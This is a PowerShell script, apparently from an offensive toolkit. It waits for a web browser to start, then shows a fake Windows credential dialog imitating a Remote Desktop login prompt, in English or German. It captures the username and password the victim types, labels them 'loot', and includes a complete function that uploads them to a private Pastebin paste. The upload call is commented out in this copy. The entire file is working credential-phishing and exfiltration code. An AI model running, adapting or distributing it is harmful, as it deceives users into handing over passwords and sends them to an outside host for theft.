# This variant scans for some common browsers and launches itself when it finds one running.

function Await($WinRtTask, $ResultType) {
	$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
	$netTask = $asTask.Invoke($null, @($WinRtTask))
	$netTask.Wait(-1) | Out-Null
	$netTask.Result
}

# Post to Pastebin
function Submit-Pastebin($pastebin_dev_key, $pastebin_username, $pastebin_password, $loot) {
	# body for login request
	$body_login = @{
		api_dev_key = $pastebin_dev_key
		api_user_name = $pastebin_username
		api_user_password = $pastebin_password
	}

	# login to Pastebin for temporary API key
	Write-Host "Getting API key"
	$pastebin_api_key = Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_login.php" -Body $body_login

	# if $api_key is empty there was probably an authentication error
	if ($null -eq $pastebin_api_key) {
		Write-Host -ForegroundColor Red "Please check network connectivity, username, password or developer key"
		exit
	} else {
		# body for post request
		$body_post = @{
			api_option = "paste"
			api_user_key = $pastebin_api_key
			api_paste_private = "2"
			api_dev_key = $pastebin_dev_key
			api_paste_code = $loot
			api_paste_name = ((Get-Date -Format "yyyyMMdd_HHmmss") + "_Loot")
		}
		# post loot to Pastebin
		Write-Host "Sending loot to Pastebin"
		Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_post.php" -Body $body_post
		if (!$?) {
			Write-Host -ForegroundColor Red "Please check network connectivity, username, password or developer key"
			exit
		} else {
			Write-Host -ForegroundColor Green "Upload successful!"
			exit
		}
	}
}

# Get currently running Browser
function Get-Browser() {
	while ($true) {
		$process_list = Get-Process | Select-Object ProcessName -ExpandProperty ProcessName
		if ($process_list -clike '*firefox*') {
			return "Mozilla Firefox"
		}
		if ($process_list -clike '*chrome*') {
			return "Google Chrome"
		}
		if ($process_list -clike '*msedge*') {
			return "Microsoft Edge"
		}
		Start-Sleep -Seconds 3
	}
}

# Pastebin username
$pastebin_username = "USERNAME"
# Pastebin password
$pastebin_password = "PASSWORD"
# Pastebin API key from https://pastebin.com/doc_api
$pastebin_dev_key = "DEVKEY"

# This script currently only works on powershell 5
if ((Get-Host).Version.Major -ne 5) {
	# downgrade
	powershell -Version 5 -File $MyInvocation.MyCommand.Definition
	exit
}

# Get Oulook e-mail name from .ost or .pst file
Write-Host "Waiting for a browser to open"
$browser = Get-Browser
Write-Host "Browser " -NoNewline
Write-Host -ForegroundColor Green $browser -NoNewLine
Write-Host " is open"
Start-Sleep -Seconds 5

# Supported languages (text is inspired from the remote desktop login prompt)
$message_en = "These credentials will be used to connect to $browser"
$message_de = "Diese Anmeldeinformationen werden beim Herstellen einer Verbindung mit $browser verwendet."

# Get the first installed language with Get-WinUserLanguageList (if no supported language is found the script will use English)
$language =  $(Get-WinUserLanguageList)[0].LanguageTag
switch ($language) {
	en-AU {$message = $message_en}
	en-BZ {$message = $message_en}
	en-CA {$message = $message_en}
	en-CB {$message = $message_en}
	en-GB {$message = $message_en}
	en-IN {$message = $message_en}
	en-IE {$message = $message_en}
	en-JM {$message = $message_en}
	en-NZ {$message = $message_en}
	en-PH {$message = $message_en}
	en-ZA {$message = $message_en}
	en-TT {$message = $message_en}
	en-US {$message = $message_en}
	de-AT {$message = $message_de}
	de-DE {$message = $message_de}
	de-LI {$message = $message_de}
	de-LU {$message = $message_de}
	de-CH {$message = $message_de}
	default {$message = $message_en}
}

# Add assemblies
$null = [Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials,ContentType=WindowsRuntime]
$null = [Windows.UI.Popups.MessageDialog,Windows.UI.Popups,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.AdaptiveTrigger,Windows.UI.Xaml,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.Controls.AppBar,Windows.UI.Xaml.Controls,ContentType=WindowsRuntime]
$null = Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]

# Set the window options
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.TargetName = $browser
$options.Caption = $browser
$options.Message = $message
$options.AuthenticationProtocol = [Windows.Security.Credentials.UI.AuthenticationProtocol]::Basic
$options.CredentialSaveOption = [Windows.Security.Credentials.UI.CredentialSaveOption]::Unselected

Write-Host "Waiting for user input"
$creds = Await $([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
$username = $creds.CredentialUserName
$pass = $creds.CredentialPassword

if ([string]::isnullorempty($creds.CredentialPassword)) {
	Write-Host -ForegroundColor Red "Password was empty!"
	continue
} elseif ([string]::isnullorempty($creds.CredentialUserName)) {
	Write-Host -ForegroundColor Red "Username was empty!"
	continue
} else {
	$loot = "$($username):$($pass)"
	Write-Host -ForegroundColor Green "Houston we have LOOT:" 
	Write-Host -ForegroundColor Green $loot
	#Submit-Pastebin $pastebin_dev_key $pastebin_username $pastebin_password $loot
}